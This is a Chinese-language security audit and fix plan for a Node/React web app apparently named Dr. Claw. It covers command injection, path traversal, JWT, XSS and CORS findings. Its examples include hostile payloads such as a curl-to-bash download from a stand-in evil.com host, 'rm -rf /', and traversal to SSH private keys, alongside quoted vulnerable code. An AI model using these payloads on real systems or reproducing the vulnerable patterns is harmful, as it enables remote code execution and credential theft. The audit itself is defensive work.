# Dr. Claw 安全审计与修复计划

> **审计日期**: 2026-03-22
> **审计范围**: 全项目源码（server/、src/、scripts/、agent-harness/）、npm 依赖
> **审计方法**: 静态代码分析，覆盖认证授权、命令注入、路径穿越、XSS、WebSocket、SQL 注入、依赖漏洞等维度

---

## 目录

- [风险总览](#风险总览)
- [CRITICAL — 必须立即修复](#critical--必须立即修复)
  - [C-1 Shell WebSocket 命令注入](#c-1-shell-websocket-命令注入)
  - [C-2 Compute Node 远程命令注入](#c-2-compute-node-远程命令注入)
  - [C-3 Compute Node 本地命令注入 — SSH 参数拼接](#c-3-compute-node-本地命令注入--ssh-参数拼接)
  - [C-4 Git 路由路径穿越](#c-4-git-路由路径穿越)
  - [C-5 projectName 路径穿越](#c-5-projectname-路径穿越)
  - [C-6 JWT 默认密钥硬编码](#c-6-jwt-默认密钥硬编码)
  - [C-7 Git config 命令注入](#c-7-git-config-命令注入)
- [HIGH — 短期必须解决](#high--短期必须解决)
  - [H-1 CORS 完全开放](#h-1-cors-完全开放)
  - [H-2 XSS — PRDEditor 自制 Markdown 渲染](#h-2-xss--prdeditor-自制-markdown-渲染)
  - [H-3 JWT 永不过期](#h-3-jwt-永不过期)
  - [H-4 平台模式绕过认证](#h-4-平台模式绕过认证)
  - [H-5 登录/注册无速率限制](#h-5-登录注册无速率限制)
  - [H-6 Token 存储在 localStorage](#h-6-token-存储在-localstorage)
  - [H-7 /api/commands/load 路径校验不足](#h-7-apicommandsload-路径校验不足)
  - [H-8 WebSocket 无消息大小限制](#h-8-websocket-无消息大小限制)
  - [H-9 Compute Node rsync / sbatch 注入](#h-9-compute-node-rsync--sbatch-注入)
  - [H-10 npm 依赖 HIGH 级漏洞](#h-10-npm-依赖-high-级漏洞)
- [MEDIUM — 应尽快改善](#medium--应尽快改善)
- [LOW — 可择机处理](#low--可择机处理)
- [积极发现 — 做得好的方面](#积极发现--做得好的方面)
- [修复路线图](#修复路线图)

---

## 风险总览

| 级别 | 数量 | 主要类别 |
|------|------|----------|
| CRITICAL | 7 | 命令注入 ×4、路径穿越 ×2、JWT 密钥 ×1 |
| HIGH | 10 | CORS、XSS、JWT 过期、认证绕过、速率限制、依赖漏洞等 |
| MEDIUM | 11 | HTTP 头、CSRF、错误泄露、WebSocket Origin、.env 注入等 |
| LOW | 3 | 密码强度、用户名枚举、News 配置写入 |

---

## CRITICAL — 必须立即修复

### C-1 Shell WebSocket 命令注入

**文件**: `server/index.js` ~1678-1686 行
**攻击向量**: 已认证用户通过 WebSocket 发送恶意 `projectPath` / `sessionId` / `initialCommand`

**问题代码**:
```javascript
// server/index.js ~1682-1686
if (os.platform() === 'win32') {
    shellCommand = `Set-Location -Path "${projectPath}"; ${shellInitialCommand}`;
} else {
    shellCommand = `cd "${projectPath}" && ${shellInitialCommand}`;
}
```

`projectPath`、`sessionId`、`initialCommand` 来自 WebSocket 消息 `data`，未做任何校验或转义就拼入 shell 命令字符串并通过 `node-pty` 执行。

**攻击示例**:
- `projectPath = '"; rm -rf / #'` → 执行 `cd ""; rm -rf / #" && ...`
- `initialCommand = "x; curl http://evil.com/shell.sh | bash"` → 直接拼入执行
- `sessionId = 'x" && id > /tmp/pwned; "'` → `--resume="x" && id > /tmp/pwned; ""`

**修复方案**:
1. 对 `projectPath` 调用 `validateWorkspacePath()` 校验是否在允许目录内
2. 对 `sessionId` 做正则白名单校验（仅允许 `[a-zA-Z0-9_-]`）
3. 对 `initialCommand` 做严格白名单（仅允许预定义的 CLI 命令如 `claude`、`gemini`、`codex` 加参数数组），或改用 `spawn(cmd, args, { shell: false })` 形式
4. 使用 `shell-quote` 或类似库转义所有拼入 shell 的字符串

---

### C-2 Compute Node 远程命令注入

**文件**: `server/compute-node.js` ~317-321 行
**攻击向量**: API 请求 `req.body.command` → SSH 远程执行

**问题代码**:
```javascript
// server/compute-node.js ~317-321
return await execSsh(config, `cd ${remotePath} && ${command}`);
```

`command` 来自 `server/routes/compute.js` 的 `req.body.command`（~169-177 行），直接拼入 SSH 远程命令，在远端 shell 中执行。

**攻击示例**:
```
command: "ls; curl http://evil.com/shell.sh | bash"
```
在远端服务器执行任意命令。

**修复方案**:
1. 对 `command` 做严格白名单（仅允许预定义的计算命令）
2. 使用 SSH 协议层的 `exec` channel 代替 shell 字符串拼接
3. 若必须用 shell 字符串，用 `shell-quote` 转义所有用户输入部分
4. 对 `remotePath` 也要做路径校验

---

### C-3 Compute Node 本地命令注入 — SSH 参数拼接

**文件**: `server/compute-node.js` ~126-128, 206-217 行
**攻击向量**: 用户配置中的 `host`、`user`、`keyPath` 等字段

**问题代码**:
```javascript
// server/compute-node.js ~126-128
function execLocal(command, args, options = {}) {
  const proc = spawn(command, args, { ...options, shell: true });
  // ...
}

// ~209-211
const cmd = `${sshBase} -i ${nodeConfig.keyPath} ${nodeConfig.user}@${nodeConfig.host} ${JSON.stringify(remoteCmd)}`;
return await execLocal(cmd);
```

`execLocal` 使用 `shell: true`，整条字符串经过 shell 解析。`host`、`user`、`keyPath` 等配置值若含 shell 元字符即可被执行。

**修复方案**:
1. 将 `execLocal` 改为 `spawn(command, [arg1, arg2, ...], { shell: false })` 形式
2. 对 SSH 参数使用数组形式传递：`spawn('ssh', ['-i', keyPath, `${user}@${host}`, remoteCmd])`
3. 对所有配置字段做格式白名单校验（host: hostname 格式, user: `[a-zA-Z0-9_-]`, keyPath: 路径格式等）

---

### C-4 Git 路由路径穿越

**文件**: `server/routes/git.js` 多处（343, 412, 1282, 1332 行）
**攻击向量**: API 请求中的 `file` 参数

**问题代码**:
```javascript
// server/routes/git.js ~343-344
const filePath = path.join(projectPath, file);
const stats = await fs.stat(filePath);

// ~1282-1289 — discard 接口甚至可以删除文件
const filePath = path.join(projectPath, file);
if (stats.isDirectory()) {
    await fs.rm(filePath, { recursive: true, force: true });
} else {
    await fs.unlink(filePath);
}
```

`file` 参数来自 `req.query` / `req.body`，不做越界检查。

**受影响接口**:
- `GET /api/git/diff` — 可读取任意文件 diff
- `GET /api/git/file-with-diff` — 可读取任意文件内容
- `POST /api/git/discard` — 可删除任意文件/目录
- `POST /api/git/delete-untracked` — 可删除任意文件

**攻击示例**: `file=../../etc/passwd` 或 `file=../../.ssh/id_rsa`

**修复方案**:
```javascript
const filePath = path.resolve(path.join(projectPath, file));
const normalizedRoot = path.resolve(projectPath) + path.sep;
if (!filePath.startsWith(normalizedRoot)) {
    return res.status(403).json({ error: 'Path must be within project directory' });
}
```
对所有使用 `file` 参数的接口统一加上路径归属校验。建议抽取为公共中间件 `validateFileInProject(projectPath, file)`。

---

### C-5 projectName 路径穿越

**文件**: `server/projects.js` ~727-744 行, `server/index.js` ~1085-1091 行
**攻击向量**: URL 参数 `:projectName`

**问题代码**:
```javascript
// server/projects.js ~742-744
const decoded = projectName.replace(/-/g, '/');
extractedPath = decoded === '/' ? os.homedir() : decoded;

// server/index.js ~1085-1091 — fallback 更危险
try {
    actualPath = await extractProjectDirectory(req.params.projectName);
} catch (error) {
    actualPath = req.params.projectName.replace(/-/g, '/');
}
```

`projectName` 中的 `-` 被替换为 `/`，`..-..-..` 会变成 `../../..`，可逃逸到文件系统任意位置。

**修复方案**:
1. 在 `extractProjectDirectory` 中对解码后的路径做 `path.resolve` + 白名单目录校验
2. 移除或修复 fallback 逻辑，不应直接将 `projectName` 转为路径
3. 可考虑改用项目 ID（UUID）而非路径编码作为标识

---

### C-6 JWT 默认密钥硬编码

**文件**: `server/middleware/auth.js` 第 5-6 行

**问题代码**:
```javascript
const JWT_SECRET = process.env.JWT_SECRET || 'claude-ui-dev-secret-change-in-production';
```

默认密钥是公开的字符串，未配置环境变量时任何人都可以用它伪造 JWT。

**修复方案**:
```javascript
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) {
    if (process.env.NODE_ENV === 'production') {
        console.error('[FATAL] JWT_SECRET must be set in production. Exiting.');
        process.exit(1);
    }
    console.warn('[WARN] JWT_SECRET not set — using random ephemeral secret. Tokens will not survive restart.');
}
const EFFECTIVE_SECRET = JWT_SECRET || require('crypto').randomBytes(32).toString('hex');
```

---

### C-7 Git config 命令注入

**文件**: `server/routes/user.js` ~57-59 行
**攻击向量**: 用户设置中的 `gitName` / `gitEmail`

**问题代码**:
```javascript
await execAsync(`git config --global user.name "${gitName.replace(/"/g, '\\"')}"`);
await execAsync(`git config --global user.email "${gitEmail.replace(/"/g, '\\"')}"`);
```

仅转义了双引号，未处理 `$()`、反引号 `` ` ``、`\` 等 shell 元字符。

**攻击示例**: `gitName = '$(id > /tmp/pwned)'`

**修复方案**:
```javascript
const { execFile } = require('child_process');
await execFileAsync('git', ['config', '--global', 'user.name', gitName]);
await execFileAsync('git', ['config', '--global', 'user.email', gitEmail]);
```
`execFile` 不经过 shell，参数直接传递给 git，无注入风险。

---

## HIGH — 短期必须解决

### H-1 CORS 完全开放

**文件**: `server/index.js` 第 357 行

**问题**: `app.use(cors())` 无配置，接受所有 Origin。

**修复方案**:
```javascript
app.use(cors({
    origin: (origin, callback) => {
        const allowed = (process.env.ALLOWED_ORIGINS || 'http://localhost:5173,http://localhost:3001').split(',');
        if (!origin || allowed.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('CORS not allowed'));
        }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
}));
```

---

### H-2 XSS — PRDEditor 自制 Markdown 渲染

**文件**: `src/components/PRDEditor.jsx` ~492-696 行

**问题**: `renderMarkdown` 用简单正则替换，不做 HTML 转义，结果直接放入 `dangerouslySetInnerHTML`。

**修复方案**:
```bash
npm install marked dompurify
```
```javascript
import { marked } from 'marked';
import DOMPurify from 'dompurify';

const renderMarkdown = (markdown) => DOMPurify.sanitize(marked.parse(markdown));
```

---

### H-3 JWT 永不过期

**文件**: `server/middleware/auth.js` ~56-66 行

**问题**: `jwt.sign` 未设置 `expiresIn`，token 永久有效。

**修复方案**:
```javascript
const generateToken = (user) => {
    return jwt.sign(
        { userId: user.id, username: user.username },
        JWT_SECRET,
        { expiresIn: '24h', algorithm: 'HS256' }  // 同时限定算法
    );
};
```
后续可引入 refresh token 机制实现无感续期。

---

### H-4 平台模式绕过认证

**文件**: `server/middleware/auth.js` ~23-31 行

**问题**: `IS_PLATFORM=true` 时跳过所有 JWT 校验，直接以数据库第一个用户身份放行。

**修复方案**:
1. 在平台模式下要求反向代理注入可信用户头（如 `X-Forwarded-User`），并校验来源 IP
2. 或要求平台模式必须配合 `API_KEY` 使用
3. 添加启动时警告日志

---

### H-5 登录/注册无速率限制

**文件**: `server/routes/auth.js`、`server/index.js`

**修复方案**:
```bash
npm install express-rate-limit
```
```javascript
const rateLimit = require('express-rate-limit');

const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 分钟
    max: 10,                    // 最多 10 次
    message: { error: 'Too many attempts, please try again later' },
    standardHeaders: true,
});

app.use('/api/auth/login', authLimiter);
app.use('/api/auth/register', authLimiter);
```

---

### H-6 Token 存储在 localStorage

**文件**: `src/utils/api.js`、`src/contexts/AuthContext.jsx`

**问题**: JWT 存在 `localStorage`，任何 XSS 漏洞都能窃取。

**修复方案**: 改用服务端设置 httpOnly Cookie：
```javascript
// 服务端 — 登录成功后
res.cookie('auth-token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000,
});
```
前端不再在 JS 中存储或读取 token。

---

### H-7 /api/commands/load 路径校验不足

**文件**: `server/routes/commands.js` ~467-478 行

**问题**: 校验仅要求"在 homedir 下"或"路径包含 `.claude/commands`"，可读取 `~/.ssh/id_rsa` 等。

**修复方案**:
```javascript
const allowedDirs = [
    path.resolve(os.homedir(), '.claude', 'commands'),
    ...(projectPath ? [path.resolve(projectPath, '.claude', 'commands')] : []),
];
const resolvedPath = path.resolve(commandPath);
const isAllowed = allowedDirs.some(dir => resolvedPath.startsWith(dir + path.sep));
if (!isAllowed) {
    return res.status(403).json({ error: 'Access denied' });
}
```

---

### H-8 WebSocket 无消息大小限制

**文件**: `server/index.js` WebSocket 创建处

**修复方案**:
```javascript
const wss = new WebSocketServer({
    server,
    maxPayload: 1 * 1024 * 1024,  // 1MB
    // ...
});
```

---

### H-9 Compute Node rsync / sbatch 注入

**文件**: `server/compute-node.js` ~298-305, ~421-424 行

**问题**: `cwd`、`files`、`workDir` 来自 `req.body`，直接拼入 rsync 和 SSH 命令。

**修复方案**:
1. 对 `cwd` 做 `validateWorkspacePath` 校验
2. 对 `files` 数组中每个元素做白名单校验（仅允许 `[a-zA-Z0-9._/-]`，禁止 `..`）
3. rsync 参数使用数组形式传递
4. sbatch 脚本通过 stdin 管道传递，不通过 base64 拼接

---

### H-10 npm 依赖 HIGH 级漏洞

**当前状态** (2026-03-22):

| 包名 | 严重程度 | 受影响版本 |
|------|----------|-----------|
| undici | HIGH | <=6.23.0 |
| tar | HIGH | <=7.5.10 |
| sqlite3 | HIGH | 5.0.0-5.1.7 |
| cacache | HIGH | 14.0.0-18.0.4 |
| node-gyp | HIGH | <=10.3.1 |
| make-fetch-happen | HIGH | 7.1.1-14.0.0 |
| release-it | HIGH | >=18.0.0-next.0 |

**修复方案**:
```bash
npm audit fix
# 若需要 breaking change:
npm audit fix --force
# 或逐个升级:
npm install undici@latest tar@latest
```

---

## MEDIUM — 应尽快改善

### M-1 JWT 算法未显式限制

**文件**: `server/middleware/auth.js` ~42 行

**问题**: `jwt.verify(token, JWT_SECRET)` 未指定 `algorithms`。

**修复**: `jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] })`

---

### M-2 登出无服务端撤销

**文件**: `server/routes/auth.js` ~121-125 行

**修复方案**: 维护 token 黑名单（内存/Redis），或依赖短期 token + refresh token 机制。

---

### M-3 WebSocket token 在 URL 中传递

**文件**: `src/contexts/WebSocketContext.tsx`

**问题**: `ws://host/ws?token=xxx` — token 进入浏览器历史、代理日志、Referrer。

**修复**: 改为在 WebSocket 握手时通过子协议或首条消息传递 token。

---

### M-4 WebSocket 无 Origin 校验

**文件**: `server/index.js` WebSocket `verifyClient`

**修复**: 在 `verifyClient` 中校验 `info.origin`。

---

### M-5 缺少安全 HTTP 头

**文件**: `server/index.js`

**修复**:
```bash
npm install helmet
```
```javascript
const helmet = require('helmet');
app.use(helmet());
```

---

### M-6 无 CSRF 防护

**修复**: 若 token 迁移到 Cookie，必须同步实现 CSRF token 或使用 `SameSite=Strict`。

---

### M-7 错误响应泄露 stack trace 和内部路径

**文件**: 多处（`server/routes/git.js`、`projects.js`、`news.js` 等）

**修复**: 统一错误处理中间件，生产环境返回通用错误信息，详细信息仅记录日志。

---

### M-8 .env 注入 — verify-custom-api

**文件**: `server/routes/cli-auth.js` ~448-461 行

**问题**: `baseUrl`、`token` 写入 `.env` 时未校验换行符，可注入新环境变量。

**修复**: 校验值不含 `\n`、`\r`、`=`，或使用结构化配置格式。

---

### M-9 Mermaid SVG 未经净化

**文件**: `src/components/survey/view/MermaidDiagramViewer.tsx` ~107 行

**修复**: `dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(svg) }}`

---

### M-10 Skills scan-local 允许扫描任意目录

**文件**: `server/routes/skills.js` ~324-326 行

**修复**: 将 `path` 限制在固定白名单目录（如 `~/.claude/skills`、项目 `skills/`）。

---

### M-11 文件上传未校验 MIME 类型

**文件**: `server/index.js` ~1037-1039 行

**修复**: multer `fileFilter` 中校验 MIME 类型白名单。

---

## LOW — 可择机处理

### L-1 密码强度校验偏弱

**文件**: `server/routes/auth.js` ~26-27 行

仅检查长度 >= 6，建议增加复杂度要求。

### L-2 注册时用户存在性泄漏

**文件**: `server/routes/auth.js` ~36-40 行

409 响应暴露用户名是否存在，建议返回通用信息。

### L-3 News 配置直接写入 req.body

**文件**: `server/routes/news.js` ~184-185 行

建议使用 schema 校验再写入。

---

## 积极发现 — 做得好的方面

| 方面 | 评价 |
|------|------|
| **密码存储** | bcrypt + salt rounds=12，实现正确 |
| **SQL 查询** | 全面参数化，未发现 SQL 注入 |
| **validateWorkspacePath** | 使用 `realpath` + symlink 检查，限制在允许目录内 |
| **Skills 文件 API** | `resolved.startsWith(skillsDir + sep)` 校验正确 |
| **.gitignore** | `.env` 及变体已被排除 |
| **前端无 eval** | 未发现 `eval()`、`Function()`、`vm` 等动态执行 |
| **数据库迁移** | 结构化迁移，无动态 SQL |

---

## 修复路线图

### P0 — 立即（一周内）

> 这些漏洞允许已认证用户在服务器上执行任意代码或读写任意文件。
> 加上 JWT 默认密钥，攻击者甚至不需要真实凭据。

| 编号 | 任务 | 涉及文件 | 预估工时 |
|------|------|----------|----------|
| C-1 | 修复 Shell WebSocket 命令注入 | `server/index.js` | 4h |
| C-2 | 修复 Compute Node 远程命令注入 | `server/compute-node.js` | 3h |
| C-3 | 修复 Compute Node 本地命令注入 | `server/compute-node.js` | 3h |
| C-4 | 修复 Git 路由路径穿越 | `server/routes/git.js` | 2h |
| C-5 | 修复 projectName 路径穿越 | `server/projects.js`, `server/index.js` | 3h |
| C-6 | 修复 JWT 默认密钥 | `server/middleware/auth.js` | 1h |
| C-7 | 修复 Git config 命令注入 | `server/routes/user.js` | 1h |

**P0 合计**: ~17h

### P1 — 短期（两周内）

| 编号 | 任务 | 涉及文件 | 预估工时 |
|------|------|----------|----------|
| H-1 | 配置 CORS 白名单 | `server/index.js` | 1h |
| H-2 | 修复 PRDEditor XSS | `src/components/PRDEditor.jsx` | 2h |
| H-3 | JWT 添加过期时间 | `server/middleware/auth.js` | 2h |
| H-5 | 添加登录速率限制 | `server/routes/auth.js`, `server/index.js` | 1h |
| H-7 | 修复 commands/load 路径校验 | `server/routes/commands.js` | 1h |
| H-8 | WebSocket 消息大小限制 | `server/index.js` | 0.5h |
| H-9 | 修复 rsync/sbatch 注入 | `server/compute-node.js` | 3h |
| H-10 | 更新有漏洞的 npm 依赖 | `package.json` | 2h |

**P1 合计**: ~12.5h

### P2 — 中期（一个月内）

| 编号 | 任务 | 涉及文件 | 预估工时 |
|------|------|----------|----------|
| H-4 | 加固平台模式认证 | `server/middleware/auth.js` | 3h |
| H-6 | Token 从 localStorage 迁移到 httpOnly Cookie | 前后端多处 | 6h |
| M-1 | JWT 限定算法 | `server/middleware/auth.js` | 0.5h |
| M-2 | 实现 token 撤销机制 | 新增 token blacklist | 4h |
| M-3 | WebSocket token 不在 URL 传递 | 前后端 WebSocket 逻辑 | 2h |
| M-4 | WebSocket Origin 校验 | `server/index.js` | 1h |
| M-5 | 添加安全 HTTP 头 (Helmet) | `server/index.js` | 0.5h |
| M-6 | CSRF 防护 | 前后端 | 3h |
| M-7 | 统一错误处理，不泄露内部信息 | 全局错误中间件 | 3h |
| M-8 | 修复 .env 注入 | `server/routes/cli-auth.js` | 1h |
| M-9 | Mermaid SVG 净化 | `MermaidDiagramViewer.tsx` | 0.5h |
| M-10 | Skills 路径白名单 | `server/routes/skills.js` | 1h |
| M-11 | 文件上传 MIME 校验 | `server/index.js` | 1h |

**P2 合计**: ~26.5h

### P3 — 长期

| 编号 | 任务 |
|------|------|
| L-1 | 增强密码复杂度策略 |
| L-2 | 注册接口不泄漏用户存在性 |
| L-3 | News 配置 schema 校验 |
| — | 引入自动化安全扫描 CI (npm audit, CodeQL, Snyk) |
| — | 定期依赖更新策略 (Dependabot / Renovate) |
| — | 渗透测试 |

---

## 公共安全工具函数建议

以下工具函数建议抽取到 `server/utils/security.js`，供全项目复用：

```javascript
const path = require('path');

/**
 * 校验文件路径是否在允许的根目录内，防止路径穿越。
 */
function assertPathWithin(filePath, allowedRoot) {
    const resolved = path.resolve(filePath);
    const normalizedRoot = path.resolve(allowedRoot) + path.sep;
    if (!resolved.startsWith(normalizedRoot) && resolved !== path.resolve(allowedRoot)) {
        const err = new Error('Path traversal detected');
        err.status = 403;
        throw err;
    }
    return resolved;
}

/**
 * 校验字符串仅包含安全字符（用于 sessionId、projectId 等）。
 */
function assertSafeIdentifier(value, label = 'identifier') {
    if (!/^[a-zA-Z0-9_\-]+$/.test(value)) {
        const err = new Error(`Invalid ${label}: contains unsafe characters`);
        err.status = 400;
        throw err;
    }
    return value;
}

/**
 * 清理写入 .env 的值，防止换行注入。
 */
function sanitizeEnvValue(value) {
    return String(value).replace(/[\r\n=]/g, '');
}

module.exports = { assertPathWithin, assertSafeIdentifier, sanitizeEnvValue };
```

---

## 附录：审计方法论

本次审计覆盖以下维度：
1. **认证与授权** — JWT 实现、密码存储、会话管理、auth 中间件
2. **命令注入** — child_process、node-pty、SSH/rsync 参数拼接
3. **路径穿越** — fs 操作中用户可控路径的边界校验
4. **XSS** — dangerouslySetInnerHTML、自制渲染、SVG 注入
5. **SQL 注入** — SQLite 查询参数化
6. **WebSocket** — 认证、消息校验、大小限制、Origin 校验
7. **CORS/CSRF** — 跨域配置、跨站请求伪造防护
8. **敏感信息** — 密钥管理、错误泄露、日志安全
9. **依赖安全** — npm audit 已知漏洞
10. **HTTP 安全头** — HSTS、CSP、X-Frame-Options 等
